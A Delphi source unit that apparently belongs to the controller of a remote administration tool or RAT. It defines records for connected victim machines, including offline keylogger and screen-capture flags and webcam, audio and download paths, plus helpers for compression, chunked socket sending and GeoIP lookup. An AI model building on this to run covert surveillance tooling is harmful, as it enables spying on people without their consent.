unit UnitSharedData;

interface

uses
  Forms,windows,classes,ScktComp,unitconnectionform,ComCtrls,COntrols,
  sysutils,strutils,dialogs,CompressionStreamUnitForms, UnitSplashScreen, GeoIp,untaPlib;

type
  TServerData = record
    Group: string[50];
    Name: string[50];
    Computer: string[50];
    User: string[50];
    Lan: string[15];
    Wan: string[15];
    Webcam: string[13];
    Version: string[50];
    Account: string[13];
    Os: string[50];
    Processor: string[50];
    Memory: string[50];
    Country: string[50];
    Language: string[50];
    OfflineLogger: string[5];
    OfflineScreenCapture: string[5];
    RootDir: string[255];
    DesktopDir: string[255];
    MyDocuments: string[255];
    ApplicationData: string[255];
    CountryCode: string[50];
    SerialKey: string[255];

    Special: string[255];
    
    Reserved3: string[255];
    Reserved4: string[255];
    Reserved5: string[255];
    Reserved6: string[255];
    Reserved7: string[255];
    Reserved8: string[255];
    Reserved9: string[255];
    Reserved10: string[255];
  end;

  TSocketData = class
    Data: string;
    stream: tmemorystream;
    Socket: TCustomWinSocket;
    MainSocket: TCustomWinSocket;
    IsMainSocket: bool;
    ServerData: TServerData;
    ConnectionForm: TConnectionForm;
    ListItem: TListItem;
    PingSentAt: integer;
    PingReceived: bool;
    DisconnectProc: pointer;
    ReceiveDataProc: pointer;
    SendDataProc: pointer;
    Form: pointer;
    Ping: string;
    Idle: string;
    MainPath: string;
    ScreenPath: string;
    WebcamPath: string;
    DownloadPath: string;
    AudioPath: string;
    CachePath: string;
    SentFirstPing: bool;
    FlagIndex: integer;
    NewConnection: bool;
    CompressionVersion: string;
    ConnectedAt: int64;
  end;

type
  TSendFileThread = class(TThread)
  procedure Execute;override;
  public
    Socket: TCustomWinSocket;
    Data: string;
  end;

var
  SendFile: TSendFileThread;
  Splash: TSplashScreen;
  FormLoaded: bool;
  function Compress(SocketData: TSocketData; const data: string): string;
  function Decompress(SocketData: TSocketData; const data: string): string;
  function SendData(var Socket: TCustomWinSocket; Data: string): bool;
  function FileSizeToStr(SizeInBytes: int64): string;
  function Split(Input: string; Deliminator: string; Index: integer): string;
  function LoadDataFromStream(FileName: string; var  Data: string): bool;
  function SaveDataToFile(FileName: string; Data: string): string;
  procedure DoPopup(Title: string; SocketData: TSocketData);
  function FindConnectionForm(GroupName: string): TConnectionForm;
  function FlagFromCountry(SocketData: TSocketData): integer;
  function FlagFromIp(SocketData: TSocketData): integer;
  function CountryFromIp(SocketData: TSocketData): string;
  procedure SetupIpFlag(SocketData: TSocketData);
  function ParseName(SocketData: TSocketData; Str: string): string;
  function GetListItem(Group,Computer,User: string): TListItem;
  function KbFileSizeToStr(SizeInBytes: int64): string;
  function MsgBox(Caption: string; Text: string; iType: integer):string;

  function StrFormatByteSize(dw: Int64; szBuf: PChar; uiBufSize: UINT): pChar; stdcall; external 'shlwapi.dll' name 'StrFormatByteSize64A';
  //function StrFormatByteSize(dw: DWORD; szBuf: PChar; uiBufSize: UINT): pChar; stdcall; external 'shlwapi.dll' name 'StrFormatByteSizeA';
  function StrFormatKBSize(qdw: LONGLONG; szBuf: PChar; uiBufSize: UINT): PChar; stdcall; external 'shlwapi.dll' name 'StrFormatKBSizeA';




implementation

uses
  UnitTransferManager,UnitMain,UnitSettings;

function MsgBox(Caption: string; Text: string; iType: integer):string;
begin
  case MessageBox(GetDesktopWindow,PChar(Text),PChar(Caption),iType) of
    IDABORT: Result := Result + 'Abort';
    IDCANCEL: Result := Result + 'Cancel';
    IDCONTINUE: Result := Result + 'Continue';
    IDIGNORE: Result := Result + 'Ignore';
    IDNO: Result := Result + 'No';
    IDOK: Result := Result + 'Ok';
    IDRETRY: Result := Result + 'Retry';
    IDTRYAGAIN: Result := Result + 'Try Again';
    IDYES: Result := Result + 'Yes';
  else
  end;
end;

function GetListItem(Group,Computer,User: string): TListItem;
var
  i,x: integer;
  ConnectionForm: TConnectionForm;
begin
  Result := nil;
  ConnectionForm := nil;

  for i := 0 to Screen.FormCount -1 do begin
    Application.ProcessMessages;
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    if LowerCase(TConnectionForm(Screen.Forms[i]).GroupName) <> LowerCase(Group) then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
  end;

  if ConnectionForm = nil then Exit;

  for i := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
    Application.ProcessMessages;
    if (ConnectionForm.ListView1.Items[i].SubItems[3] = User) and (ConnectionForm.ListView1.Items[i].SubItems[2] = Computer) then begin
      Result := ConnectionForm.ListView1.Items[i];
      Break;
    end;
  end;

end;

function ParseName(SocketData: TSocketData; Str: string): string;
begin
  Result := Str;
  Result := AnsiReplaceStr(Result,'%COMPUTER%',SocketData.ServerData.Computer);
  Result := AnsiReplaceStr(Result,'%USER%',SocketData.ServerData.User);
  Result := AnsiReplaceStr(Result,'%LAN%',SocketData.ServerData.Lan);
  Result := AnsiReplaceStr(Result,'%WAN%',SocketData.ServerData.Wan);
  Result := AnsiReplaceStr(Result,'%WEBCAM%',SocketData.ServerData.Webcam);
  Result := AnsiReplaceStr(Result,'%VERSION%',SocketData.ServerData.Version);
  Result := AnsiReplaceStr(Result,'%ACCOUNT%',SocketData.ServerData.Account);
  Result := AnsiReplaceStr(Result,'%SYSTEM%',SocketData.ServerData.Os);
  Result := AnsiReplaceStr(Result,'%PROCESSOR%',SocketData.ServerData.Processor);
  Result := AnsiReplaceStr(Result,'%MEMORY%',SocketData.ServerData.Memory);
  Result := AnsiReplaceStr(Result,'%COUNTRY%',SocketData.ServerData.Country);
  Result := AnsiReplaceStr(Result,'%LANGUAGE%',SocketData.ServerData.Language);
  Result := AnsiReplaceStr(Result,'%COUNTRYCODE%',SocketData.ServerData.CountryCode);
end;

function FlagFromCountry(SocketData: TSocketData): integer;
var
  country: string;
begin
  country := lowercase(SocketData.ServerData.CountryCode);
  Result := ClientForm.Strings.IndexOf(Country);
  SocketData.FlagIndex := Result;
  if Result = -1 then exit;
  Result := Result + 7;
  SocketData.FlagIndex := Result;
end;

procedure SetupIpFlag(SocketData: TSocketData);
var
   GeoIP: TGeoIP;
   GeoIPCountry: TGeoIPCountry;
   tmp: string;
begin
  SocketData.FlagIndex := -1;
  if SocketData.ServerData.Wan = '127.0.0.1' then exit;

  try

    GeoIP := TGeoIP.Create(ExtractFilePath(Application.ExeName) + 'GeoIP.dat');
    if GeoIP.GetCountry(SocketData.ServerData.Wan, GeoIPCountry) = GEOIP_SUCCESS then begin

      Socketdata.ServerData.CountryCode := GeoIPCountry.CountryCode;
      Socketdata.ServerData.Country := GeoIPCountry.CountryName;
      SocketData.FlagIndex := FlagFromCountry(SocketData);

    end;
    GeoIP.Free;

  except
  end;

end;

function FlagFromIp(SocketData: TSocketData): integer;
var
   GeoIP: TGeoIP;
   GeoIPCountry: TGeoIPCountry;
   tmp: string;
begin
  if SocketData.ServerData.Wan = '127.0.0.1' then begin
    Result := FlagFromCountry(SocketData);
    SocketData.FlagIndex := Result;
    exit;
  end;

  Result := -1;
  try
    GeoIP := TGeoIP.Create(ExtractFilePath(Application.ExeName) + 'GeoIP.dat');
    if GeoIP.GetCountry(SocketData.ServerData.Wan, GeoIPCountry) = GEOIP_SUCCESS then begin
      Tmp := Socketdata.ServerData.CountryCode;
      Socketdata.ServerData.CountryCode := GeoIPCountry.CountryCode;
      Result := FlagFromCountry(SocketData);
      Socketdata.ServerData.CountryCode := Tmp;
    end else begin
      Result := FlagFromCountry(SocketData);
    end;
    GeoIP.Free;
  except
  end;
  SocketData.FlagIndex := Result;
end;

function CountryFromIp(SocketData: TSocketData): string;
var
   GeoIP: TGeoIP;
   GeoIPCountry: TGeoIPCountry;
   tmp: string;
begin
  if SocketData.ServerData.Wan = '127.0.0.1' then begin
    Result := SocketData.ServerData.Country;
    exit;
  end;

  try
    GeoIP := TGeoIP.Create(ExtractFilePath(Application.ExeName) + 'GeoIP.dat');
    if GeoIP.GetCountry(SocketData.ServerData.Wan, GeoIPCountry) = GEOIP_SUCCESS then begin
      Socketdata.ServerData.CountryCode := GeoIPCountry.CountryCode;
      Socketdata.ServerData.Country := GeoIPCountry.CountryName;
    end;
    GeoIP.Free;
  except
  end;
end;

function FindConnectionForm(GroupName: string): TConnectionForm;
var
  i: integer;
  TabSheet: TTabSheet;
begin
  Result := nil;
  for i := 0 to Screen.FormCount -1 do begin
    //Application.ProcessMessages;
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    if LowerCase(TConnectionForm(Screen.Forms[i]).GroupName) <> LowerCase(GroupName) then Continue;
    Result := TConnectionForm(Screen.Forms[i]);
  end;
  if Result = nil then begin
    TabSheet := TTabSheet.Create(ClientForm.PageControl1);
    TabSheet.PageControl := ClientForm.PageControl1;
    Result := TConnectionForm.Create(TabSheet);
    Result.Parent := TabSheet;
    Result.Align := alClient;
    Result.BorderStyle := bsNone;
    Result.TabSheet := TabSheet;
    Result.GroupName := GroupName;
    Result.Show;
  end;
end;

function LoadDataFromStream(FileName: string; var  Data: string): bool;
var
  Stream: TMemoryStream;
begin
  Result := False;
  Stream := TMemoryStream.Create;
  try
    Stream.LoadFromFile(FileName);
    SetString(Data,pchar(Stream.Memory),Stream.Size);
    if Data = '' then exit;
    Result := True;
  finally
    Stream.Free;
  end;
end;

function SaveDataToFile(FileName: string; Data: string): string;
var
  Stream: TMemoryStream;
begin
  Stream := TMemoryStream.Create;
  Stream.Write(pointer(Data)^,length(Data));
  try
    Stream.SaveToFile(FileName);
  except
  end;
  Stream.Free;
end;

function KbFileSizeToStr(SizeInBytes: int64): string;
var
  arrSize: array[0..255] of Char;
begin
  StrFormatKBSize(SizeInBytes, arrSize, Length(arrSize)-1);
  Result := arrSize;
end;

function FileSizeToStr(SizeInBytes: int64): string;
var
  arrSize: array[0..255] of Char;
begin
  StrFormatByteSize(SizeInBytes, arrSize, Length(arrSize)-1);
  Result := arrSize;
end;

function Decompress(SocketData: TSocketData; const data: string): string;
var
  DecompressionStream: TDecompressionStream;
  InputStream,OutputStream: TMemoryStream;
  Version: string;
  Size: dword;
  lpBaseAddressIn, lpBuffer: Pointer;
begin
  Version := '0';

  if Copy(Data,1,3) = 'CF1' then begin
    if SocketData <> nil then SocketData.CompressionVersion := '1';
    Version := '1';
  end;

  if Version = '0' then begin
    if SocketData <> nil then SocketData.CompressionVersion := '0';
    InputStream := TMemoryStream.Create;
    OutputStream := TMemoryStream.Create;
    InputStream.Write(pointer(Data)^,Length(Data));
    InputStream.Position := 0;
    DecompressionStream := TDecompressionStream.Create(InputStream);
    DecompressionStream.Position := 0;
    OutputStream.CopyFrom(DecompressionStream, 0);
    SetString(Result,pchar(OutputStream.memory),OutputStream.size);
    DecompressionStream.Free;
    OutputStream.Free;
    InputStream.Free;
    exit;
  end;

  if Version = '1' then begin
    Result := Data;
    Delete(Result,1,3);
    Size := Length(Result);
    lpBuffer := DecompressMemory(@Result[1], Size);
    SetString(Result,pchar(lpBuffer),Size);
    exit;
  end;

end;

function Compress(SocketData: TSocketData; const data: string): string;
var
  CompressionStream: TCompressionStream;
  OutputStream: TMemoryStream;
  Version: string;
  Size: dword;
  lpBaseAddressIn, lpBuffer: Pointer;
begin
  if SocketData = nil then begin
    Version := '0';
  end else begin
    if SocketData.CompressionVersion = '' then Version := '0' else Version := SocketData.CompressionVersion;
  end;

  if Version = '0' then begin
    OutputStream := TMemoryStream.Create;
    CompressionStream := TCompressionStream.Create(OutputStream); // zcFastest //zcMax
    CompressionStream.Write(pointer(Data)^,Length(Data));
    CompressionStream.Free;
    SetString(Result, PChar(OutputStream.Memory), OutputStream.Size);
    OutputStream.Free;
    exit;
  end;

  if Version = '1' then begin
    Size := Length(Data);
    lpBuffer := CompressMemory(@Data[1], Size);
    SetString(Result,pchar(lpBuffer),Size);
    exit;
  end;

end;


procedure TSendFileThread.execute;
var
  Tmp: string;
  Progress,Len: int64;

  SendDataProc: procedure(Socket: TCustomWinSocket; Progress,Max: int64);
begin
  FreeOnTerminate := true;
  Len := Length(SendFile.Data);
  Progress := 0;
  @SendDataProc := TSocketData(Socket.Data).SendDataProc;

  while length(SendFile.Data) > 0 do begin
    sleep(10);
    application.ProcessMessages;

    Tmp := Copy(Data,1,4096);
    Delete(Data,1,4096);

    repeat
      sleep(10);
      application.ProcessMessages;
      try
        Socket.ReceiveText;
        //if not SendFile.Socket.Connected then break;
      except
        exit;
      end;
    until SendFile.Socket.SendBuf(pointer(Tmp)^,Length(Tmp)) <> -1;

    inc(Progress,Length(Tmp));
    if @SendDataProc <> nil then SendDataProc(Socket,Progress,Len);

    sleep(10);
    application.ProcessMessages;
    if not SendFile.Socket.Connected then break;
  end;

end;

procedure DoPopup(Title: string; SocketData: TSocketData);
begin
  //if Settings.CheckBox6.Checked then




  //ShowMessage(Title + #13#10#13#10 + 'Group: ' + SocketData.ServerData.Group + #13#10 + 'Name: ' + SocketData.ServerData.Name + #13#10 + 'Location: '
  //+ SocketData.ServerData.Country + '(' + SocketData.ServerData.Language + ')');

end;

{function SendData(var Socket: TCustomWinSocket; Data: string): bool;
var
  SendDataProc: procedure(Socket: TCustomWinSocket; Progress,Max: int64);
begin
  Result := false;

  if Socket = nil then begin
    exit;
  end;

  if Socket.Data = nil then begin
    socket := nil;
    exit;
  end;

  if not Socket.Connected then begin
    socket := nil;
    exit;
  end;

  ClientForm.Memo1.Lines.Add(Data);
  
  Data := Compress(Data);
  Data := inttostr(length(Data)) + '|' + Data;


  if Length(Data) > 4096 then begin
    SendFile := TSendFileThread.Create(True);
    SendFile.Socket := Socket;
    SendFile.Data := Data;
    SendFile.Resume;
    Result := True;
  end else begin
    Socket.SendText(Data);
    Result := True;
    @SendDataProc := TSocketData(Socket.Data).SendDataProc;
    if @SendDataProc <> nil then SendDataProc(Socket,Length(Data),Length(Data));
  end;

end;}

function SendData(var Socket: TCustomWinSocket; Data: string): bool;
var
  SendDataProc: procedure(Socket: TCustomWinSocket; Progress,Max: int64);
  Tmp: string;
  Progress,Len: int64;
  SocketData: TSocketData;
begin
  Result := false;
  if Socket = nil then Exit;
  if not Socket.Connected then exit;

  SocketData := TSocketData(Socket.Data);
  if SocketData = nil then exit;

  Data := Compress(SocketData,Data);
  Data := inttostr(length(Data)) + '|' + Data;

  @SendDataProc := SocketData.SendDataProc;

  Progress := 0;
  Len := Length(Data);

  try

    while length(Data) > 0 do begin
      Tmp := Copy(Data,1,4095);
      Delete(Data,1,4095);
      repeat
        sleep(10);
        application.ProcessMessages;
        if not Socket.Connected then exit;
      until Socket.SendBuf(pointer(Tmp)^,Length(Tmp)) <> -1;
      inc(Progress,Length(Tmp));
      if @SendDataProc <> nil then SendDataProc(Socket,Progress,Len);
      sleep(10);
      application.ProcessMessages;
    end;
    Result := True;

  except
  end;
end;

function Split(Input: string; Deliminator: string; Index: integer): string;
var
  StringLoop, StringCount: integer;
  Buffer: string;
begin
  StringCount := 0;
  for StringLoop := 1 to Length(Input) do begin
    if (Copy(Input, StringLoop, 1) = Deliminator) then begin
      Inc(StringCount);
      if StringCount = Index then begin
        Result := Buffer;
        Exit;
      end else begin
        Buffer := '';
      end;
    end else begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
  end;
  Result := Buffer;
end;

end.
